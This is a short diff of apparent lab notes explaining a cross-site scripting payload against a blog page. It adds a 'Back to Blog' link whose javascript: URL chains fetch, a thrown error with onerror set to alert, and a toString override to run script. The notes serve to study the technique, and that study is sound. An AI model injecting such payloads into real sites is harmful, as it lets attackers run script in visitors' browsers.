@@ -17,3 +17,7 @@ the first one creates an error with the alert(1337) when an error is found
 next x passes through the toString function
 window+'' makes it a string lastly 
 The last part of the payload {x:' completes the remaining JavaScript code '}.finally
+
+
+<a href="javascript:fetch('/analytics', {method:'post',body:'/post?postId=5&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window '',{x:''}).finally(_ => window.location = '/')">Back to Blog</a>
+this is present in the source code of the blog post 
